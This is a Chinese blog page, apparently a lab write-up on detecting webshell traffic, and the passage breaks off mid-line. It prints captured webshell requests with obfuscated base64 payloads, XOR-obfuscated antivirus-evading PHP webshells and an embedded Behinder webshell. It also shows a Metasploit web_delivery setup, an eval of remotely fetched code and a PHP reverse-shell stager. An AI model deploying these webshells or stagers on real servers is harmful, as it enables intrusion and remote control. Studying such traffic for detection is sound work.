@@ -1,0 +1,1105 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="generator" content="Hexo 3.9.0">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/128x128.ico?v=7.3.0">
+  <meta name="google-site-verification" content="GGFme5OaJm26Z2TDjB--Ol2pfQANqnR69mkuVsw70rU">
+
+<link rel="stylesheet" href="/css/main.css?v=7.3.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+  <link rel="stylesheet" href="/lib/fancybox/source/jquery.fancybox.css">
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2">
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    search: {
+      root: '/',
+      path: 'search.xml'
+    },
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'copy',
+      copy_success: 'succeed',
+      copy_failure: 'failed'
+    }
+  };
+</script>
+
+  <meta name="description" content="webshell流量监测一句话webshell检测POST 请求 12345678910POST /shop/d.php HTTP/1.1X-Forwarded-For: 165.40.13.244Referer: http://10.0.83.217:8080/Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5">
+<meta name="keywords" content="wireshark">
+<meta property="og:type" content="article">
+<meta property="og:title" content="webshell流量监测">
+<meta property="og:url" content="https://wh0ale.github.io/2019/09/11/webshell流量监测/index.html">
+<meta property="og:site_name" content="Wh0ale&#39;s Blog">
+<meta property="og:description" content="webshell流量监测一句话webshell检测POST 请求 12345678910POST /shop/d.php HTTP/1.1X-Forwarded-For: 165.40.13.244Referer: http://10.0.83.217:8080/Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-09-11_16-24-25.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-09-18_20-10-55.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180921104145-e1374058-bd47-1.png">
+<meta property="og:updated_time" content="2019-09-29T05:30:12.969Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="webshell流量监测">
+<meta name="twitter:description" content="webshell流量监测一句话webshell检测POST 请求 12345678910POST /shop/d.php HTTP/1.1X-Forwarded-For: 165.40.13.244Referer: http://10.0.83.217:8080/Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-09-11_16-24-25.png">
+  <link rel="alternate" href="/atom.xml" title="Wh0ale's Blog" type="application/atom+xml">
+  <link rel="canonical" href="https://wh0ale.github.io/2019/09/11/webshell流量监测/">
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>webshell流量监测 | Wh0ale's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Wh0ale's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+    <ul id="menu" class="menu">
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-sitemap">
+      
+    
+
+    <a href="/sitemap.xml" rel="section"><i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>站点地图</a>
+
+  </li>
+        <li class="menu-item menu-item-search">
+          <a href="javascript:;" class="popup-trigger">
+          
+            <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+    </div>
+</nav>
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+    <div class="reading-progress-bar"></div>
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://wh0ale.github.io/2019/09/11/webshell流量监测/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Wh0ale">
+      <meta itemprop="description" content="No master and rookie，only hardworking and lazy.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Wh0ale's Blog">
+    </span>
+      <header class="post-header">
+
+        
+          <h1 class="post-title" itemprop="name headline">webshell流量监测
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-09-11 11:22:10" itemprop="dateCreated datePublished" datetime="2019-09-11T11:22:10+08:00">2019-09-11</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-09-29 13:30:12" itemprop="dateModified" datetime="2019-09-29T13:30:12+08:00">2019-09-29</time>
+              </span>
+            
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon"
+              >
+                <i class="fa fa-eye"></i>
+                 阅读次数： 
+                <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+              </span>
+            </span>
+          <br>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span title="本文字数">30k</span>
+            </span>
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span title="阅读时长">27 分钟</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+
+
+      
+        <h1 id="webshell流量监测"><a href="#webshell流量监测" class="headerlink" title="webshell流量监测"></a>webshell流量监测</h1><h2 id="一句话webshell检测"><a href="#一句话webshell检测" class="headerlink" title="一句话webshell检测"></a>一句话webshell检测</h2><p>POST 请求</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /shop/d.php HTTP/1.1</span><br><span class="line">X-Forwarded-For: 165.40.13.244</span><br><span class="line">Referer: http://10.0.83.217:8080/</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)</span><br><span class="line">Host: 10.0.83.217:8080</span><br><span class="line">Content-Length: 836</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line"></span><br><span class="line">x=array_map(&quot;ass&quot;.&quot;ert&quot;,array(&quot;ev&quot;.&quot;Al(\&quot;\\\$xx%3D\\\&quot;Ba&quot;.&quot;SE6&quot;.&quot;4_dEc&quot;.&quot;OdE\\\&quot;;@ev&quot;.&quot;al(\\\$xx(&apos;QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7JG09Z2V0X21hZ2ljX3F1b3Rlc19ncGMoKTskcD0nY21kJzskcz0nY2QgL2QgRTpcXHBocHN0dWR5XFxXV1dcXHNob3BcXCZuZXRzdGF0IC1hbiB8IGZpbmQgIkVTVEFCTElTSEVEIiZlY2hvIFtTXSZjZCZlY2hvIFtFXSc7JGQ9ZGlybmFtZSgkX1NFUlZFUlsiU0NSSVBUX0ZJTEVOQU1FIl0pOyRjPXN1YnN0cigkZCwwLDEpPT0iLyI%2FIi1jIFwieyRzfVwiIjoiL2MgXCJ7JHN9XCIiOyRyPSJ7JHB9IHskY30iOyRhcnJheT1hcnJheShhcnJheSgicGlwZSIsInIiKSxhcnJheSgicGlwZSIsInciKSxhcnJheSgicGlwZSIsInciKSk7JGZwPXByb2Nfb3Blbigkci4iIDI%2BJjEiLCRhcnJheSwkcGlwZXMpOyRyZXQ9c3RyZWFtX2dldF9jb250ZW50cygkcGlwZXNbMV0pO3Byb2NfY2xvc2UoJGZwKTtwcmludCAkcmV0OztlY2hvKCJYQFkiKTtkaWUoKTs%3D&apos;));\&quot;);&quot;));</span><br></pre></td></tr></table></figure>
+
+<p>POST返回包</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.11.5</span><br><span class="line">Date: Wed, 11 Sep 2019 08:16:31 GMT</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">X-Powered-By: PHP/5.6.27</span><br><span class="line"></span><br><span class="line">137</span><br><span class="line">X@Y  TCP    10.0.83.217:3389       10.0.85.55:2264        ESTABLISHED</span><br><span class="line">  TCP    10.0.83.217:8080       10.0.85.55:3016        ESTABLISHED</span><br><span class="line">  TCP    127.0.0.1:9000         127.0.0.1:49190        ESTABLISHED</span><br><span class="line">  TCP    127.0.0.1:49190        127.0.0.1:9000         ESTABLISHED</span><br><span class="line">[S]</span><br><span class="line">E:\phpstudy\WWW\shop</span><br><span class="line">[E] </span><br><span class="line">X@Y</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-09-11_16-24-25.png" alt></p>
+<h2 id="webshell-venom"><a href="#webshell-venom" class="headerlink" title="webshell-venom"></a>webshell-venom</h2><p>无字符webshell：<a href="https://mp.weixin.qq.com/s/fCxs4hAVpa-sF4tdT_W8-w" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/fCxs4hAVpa-sF4tdT_W8-w</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FTLM</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $IHAX=<span class="string">'Z&gt;s#/k'</span>^<span class="string">"\x3b\x4d\x0\x46\x5d\x1f"</span>;<span class="comment">//assert</span></span><br><span class="line">        <span class="keyword">return</span> @$IHAX(<span class="string">"$this-&gt;CJHM"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$ftlm=<span class="keyword">new</span> FTLM();</span><br><span class="line">@$ftlm-&gt;CJHM=<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>])?base64_decode($_POST[<span class="string">'mr6'</span>]):$_POST[<span class="string">'mr6'</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><p>检测是否存在参数<code>id</code>，存在即把post的数据base64解密一遍，不存在即直接传参</p>
+</li>
+<li><p>利用随机异或进行免杀任意php文件</p>
+</li>
+</ol>
+<p><strong>脚本对webshell进行免杀的思路是</strong></p>
+<p>array_map函数进行处理<code>array_map(&#39;u?ldOQ&#39;^&quot;\x14\x4c\x1f\x1\x3d\x25&quot;,array((&#39;P/f}&#39;^&quot;\x35\x59\x7\x11&quot;).&quot;(base64_decode(&#39;xxxxxxxx&#39;));&quot;));</code>,异或的字符串为assert和eval</p>
+<p>下面是对冰蝎webshell的处理，base64函数里面的内容就是冰蝎的webshell</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OHNM</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;DNQF(<span class="string">'#^nCdy'</span>^<span class="string">"\x42\x2d\x1d\x26\x16\xd"</span>,<span class="keyword">array</span>((<span class="string">'@j^H'</span>^<span class="string">"\x25\x1c\x3f\x24"</span>).<span class="string">"(base64_decode('DQpAZXJyb3JfcmVwb3J0aW5nKDApOw0Kc2Vzc2lvbl9zdGFydCgpOw0KaWYgKGlzc2V0KCRfR0VUWydwYXNzJ10pKQ0Kew0KICAgICRrZXk9c3Vic3RyKG1kNSh1bmlxaWQocmFuZCgpKSksMTYpOw0KICAgICRfU0VTU0lPTlsnayddPSRrZXk7DQogICAgcHJpbnQgJGtleTsNCn0NCmVsc2UNCnsNCiAgICAka2V5PSRfU0VTU0lPTlsnayddOw0KCSRwb3N0PWZpbGVfZ2V0X2NvbnRlbnRzKCJwaHA6Ly9pbnB1dCIpOw0KCWlmKCFleHRlbnNpb25fbG9hZGVkKCdvcGVuc3NsJykpDQoJew0KCQkkdD0iYmFzZTY0XyIuImRlY29kZSI7DQoJCSRwb3N0PSR0KCRwb3N0LiIiKTsNCgkJDQoJCWZvcigkaT0wOyRpPHN0cmxlbigkcG9zdCk7JGkrKykgew0KICAgIAkJCSAkcG9zdFskaV0gPSAkcG9zdFskaV1eJGtleVskaSsxJjE1XTsgDQogICAgCQkJfQ0KCX0NCgllbHNlDQoJew0KCQkkcG9zdD1vcGVuc3NsX2RlY3J5cHQoJHBvc3QsICJBRVMxMjgiLCAka2V5KTsNCgl9DQogICAgJGFycj1leHBsb2RlKCd8JywkcG9zdCk7DQogICAgJGZ1bmM9JGFyclswXTsNCiAgICAkcGFyYW1zPSRhcnJbMV07DQoJY2xhc3MgQ3twdWJsaWMgZnVuY3Rpb24gX19jb25zdHJ1Y3QoJHApIHtldmFsKCRwLiIiKTt9fQ0KCUBuZXcgQygkcGFyYW1zKTsNCn0NCg=='));"</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">DNQF</span><span class="params">($OTHM,$EZAV)</span></span>&#123;</span><br><span class="line">        @array_map($OTHM,$EZAV);</span><br><span class="line">    &#125;&#125;</span><br><span class="line">$ohnm=<span class="keyword">new</span> OHNM();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>POST请求包</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /venom.php HTTP/1.1</span><br><span class="line">X-Forwarded-For: 176.103.163.124</span><br><span class="line">Referer: http://10.0.83.217:8080/</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)</span><br><span class="line">Host: 10.0.83.217:8080</span><br><span class="line">Content-Length: 676</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line"></span><br><span class="line">mr6=array_map(&quot;ass&quot;.&quot;ert&quot;,array(&quot;ev&quot;.&quot;Al(\&quot;\\\$xx%3D\\\&quot;Ba&quot;.&quot;SE6&quot;.&quot;4_dEc&quot;.&quot;OdE\\\&quot;;@ev&quot;.&quot;al(\\\$xx(&apos;QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7JEQ9ZGlybmFtZShfX0ZJTEVfXyk7JFI9InskRH1cdCI7aWYoc3Vic3RyKCRELDAsMSkhPSIvIil7Zm9yZWFjaChyYW5nZSgiQSIsIloiKSBhcyAkTClpZihpc19kaXIoInskTH06IikpJFIuPSJ7JEx9OiI7fSRSLj0iXHQiOyR1PShmdW5jdGlvbl9leGlzdHMoJ3Bvc2l4X2dldGVnaWQnKSk%2FQHBvc2l4X2dldHB3dWlkKEBwb3NpeF9nZXRldWlkKCkpOicnOyR1c3I9KCR1KT8kdVsnbmFtZSddOkBnZXRfY3VycmVudF91c2VyKCk7JFIuPXBocF91bmFtZSgpOyRSLj0iKHskdXNyfSkiO3ByaW50ICRSOztlY2hvKCJYQFkiKTtkaWUoKTs%3D&apos;));\&quot;);&quot;));</span><br></pre></td></tr></table></figure>
+
+<p>POST响应包</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.11.5</span><br><span class="line">Date: Thu, 12 Sep 2019 09:31:12 GMT</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">X-Powered-By: PHP/5.6.27</span><br><span class="line"></span><br><span class="line">83</span><br><span class="line">X@YE:\phpstudy\WWW	C:E:	Windows NT WIN-OMZKKO5S2WH 6.0 build 6002 (Windows Server 2008 Web Server Edition Service Pack 2) i586()X@Y</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
+
+<h2 id="web-delivery"><a href="#web-delivery" class="headerlink" title="web_delivery"></a>web_delivery</h2><p>shell地址：<a href="http://10.0.83.217:8080/web_delivery.php" target="_blank" rel="noopener">http://10.0.83.217:8080/web_delivery.php</a></p>
+<p>wiresahrk抓包：<code>ip.addr == 10.0.83.217 &amp;&amp; not ssh &amp;&amp; !(tcp.port==3389)</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=60.205.212.140 LPORT=8888 -f raw &gt; shell.php</span><br><span class="line">use exploit/multi/script/web_delivery</span><br><span class="line">msf exploit (web_delivery)&gt; set payload php/meterpreter/reverse_tcp</span><br><span class="line">msf exploit (web_delivery)&gt; set lhost 0.0.0.0</span><br><span class="line">msf exploit (web_delivery)&gt;set SRVPORT 8081</span><br><span class="line">msf exploit (web_delivery)&gt;set target 1</span><br><span class="line">msf exploit (web_delivery)&gt;exploit</span><br></pre></td></tr></table></figure>
+
+<p>web_delivery.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">eval</span>(file_get_contents(<span class="string">'http://10.0.85.55:8081/bGI3P5ta1iAm5XW'</span>));</span><br><span class="line">  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>其中<code>http://10.0.85.55:8081/bGI3P5ta1iAm5XW</code>内容为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*&lt;?php /**/</span> error_reporting(<span class="number">0</span>); $ip = <span class="string">'10.0.85.55'</span>; $port = <span class="number">4444</span>; <span class="keyword">if</span> (($f = <span class="string">'stream_socket_client'</span>) &amp;&amp; is_callable($f)) &#123; $s = $f(<span class="string">"tcp://&#123;$ip&#125;:&#123;$port&#125;"</span>); $s_type = <span class="string">'stream'</span>; &#125; <span class="keyword">if</span> (!$s &amp;&amp; ($f = <span class="string">'fsockopen'</span>) &amp;&amp; is_callable($f)) &#123; $s = $f($ip, $port); $s_type = <span class="string">'stream'</span>; &#125; <span class="keyword">if</span> (!$s &amp;&amp; ($f = <span class="string">'socket_create'</span>) &amp;&amp; is_callable($f)) &#123; $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); <span class="keyword">if</span> (!$res) &#123; <span class="keyword">die</span>(); &#125; $s_type = <span class="string">'socket'</span>; &#125; <span class="keyword">if</span> (!$s_type) &#123; <span class="keyword">die</span>(<span class="string">'no socket funcs'</span>); &#125; <span class="keyword">if</span> (!$s) &#123; <span class="keyword">die</span>(<span class="string">'no socket'</span>); &#125; <span class="keyword">switch</span> ($s_type) &#123; <span class="keyword">case</span> <span class="string">'stream'</span>: $len = fread($s, <span class="number">4</span>); <span class="keyword">break</span>; <span class="keyword">case</span> <span class="string">'socket'</span>: $len = socket_read($s, <span class="number">4</span>); <span class="keyword">break</span>; &#125; <span class="keyword">if</span> (!$len) &#123; <span class="keyword">die</span>(); &#125; $a = unpack(<span class="string">"Nlen"</span>, $len); $len = $a[<span class="string">'len'</span>]; $b = <span class="string">''</span>; <span class="keyword">while</span> (strlen($b) &lt; $len) &#123; <span class="keyword">switch</span> ($s_type) &#123; <span class="keyword">case</span> <span class="string">'stream'</span>: $b .= fread($s, $len-strlen($b)); <span class="keyword">break</span>; <span class="keyword">case</span> <span class="string">'socket'</span>: $b .= socket_read($s, $len-strlen($b)); <span class="keyword">break</span>; &#125; &#125; $GLOBALS[<span class="string">'msgsock'</span>] = $s; $GLOBALS[<span class="string">'msgsock_type'</span>] = $s_type; <span class="keyword">if</span> (extension_loaded(<span class="string">'suhosin'</span>) &amp;&amp; ini_get(<span class="string">'suhosin.executor.disable_eval'</span>)) &#123; $suhosin_bypass=create_function(<span class="string">''</span>, $b); $suhosin_bypass(); &#125; <span class="keyword">else</span> &#123; <span class="keyword">eval</span>($b); &#125; <span class="keyword">die</span>();</span><br></pre></td></tr></table></figure>
+
+<p>pcap数据包</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">GET /<span class="number">5</span>fLYpgOj0FD9F HTTP/<span class="number">1.0</span></span><br><span class="line">Host: <span class="number">10.0</span><span class="number">.85</span><span class="number">.55</span>:<span class="number">8081</span></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line">Connection: close</span><br><span class="line">Server: Apache</span><br><span class="line">Content-Length: <span class="number">1111</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*&lt;?php /**/</span>error_reporting(<span class="number">0</span>);</span><br><span class="line">$ip   = <span class="string">'10.0.85.55'</span>;</span><br><span class="line">$port = <span class="number">4444</span>;<span class="keyword">if</span> (($f = <span class="string">'stream_socket_client'</span>) &amp;&amp; is_callable($f)) &#123;</span><br><span class="line">	$s      = $f(<span class="string">"tcp://&#123;$ip&#125;:&#123;$port&#125;"</span>);</span><br><span class="line">	$s_type = <span class="string">'stream'</span>;&#125;<span class="keyword">if</span> (!$s &amp;&amp; ($f = <span class="string">'fsockopen'</span>) &amp;&amp; is_callable($f)) &#123;</span><br><span class="line">	$s      = $f($ip, $port);</span><br><span class="line">	$s_type = <span class="string">'stream'</span>;&#125;<span class="keyword">if</span> (!$s &amp;&amp; ($f = <span class="string">'socket_create'</span>) &amp;&amp; is_callable($f)) &#123;</span><br><span class="line">	$s      = $f(AF_INET, SOCK_STREAM, SOL_TCP);</span><br><span class="line">	$res    = @socket_connect($s, $ip, $port);<span class="keyword">if</span> (!$res) &#123;<span class="keyword">die</span>();&#125;</span><br><span class="line">	$s_type = <span 